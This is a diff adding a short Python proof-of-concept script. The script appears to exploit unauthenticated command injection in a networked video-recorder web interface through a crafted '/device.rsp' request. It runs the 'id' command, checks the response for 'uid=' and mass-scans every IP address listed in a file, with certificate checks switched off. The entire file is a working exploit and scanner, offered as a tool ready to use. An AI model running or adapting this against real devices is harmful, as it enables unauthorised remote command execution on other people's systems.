@@ -1,0 +1,42 @@
+import requests
+import urllib.parse
+
+EXPECTED_SUBSTRING = "uid="
+
+
+def run_poc(target_url):
+    base_url = target_url.strip()
+    command = "id"
+    encoded_command = urllib.parse.quote(command)
+
+    path = f"/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc={encoded_command}"
+    url = f"{base_url.rstrip('/')}{path}"
+
+    try:
+        response = requests.get(url, headers={"Cookie": "uid=1"}, timeout=20, verify=False)
+
+        if EXPECTED_SUBSTRING in response.text:
+            print(f"[!] find vul: {base_url} | response: {EXPECTED_SUBSTRING}")
+        else:
+            print(f"[-] {base_url} no vul")
+
+    except requests.exceptions.RequestException:
+        print(f"[x] {base_url} time out")
+
+
+def main():
+    try:
+        with open("ip.txt", "r") as f:
+            lines = f.readlines()
+            for line in lines:
+                run_poc(line)
+    except FileNotFoundError:
+        print("Error: not find ip.txt")
+
+
+if __name__ == "__main__":
+    import urllib3
+
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    main()
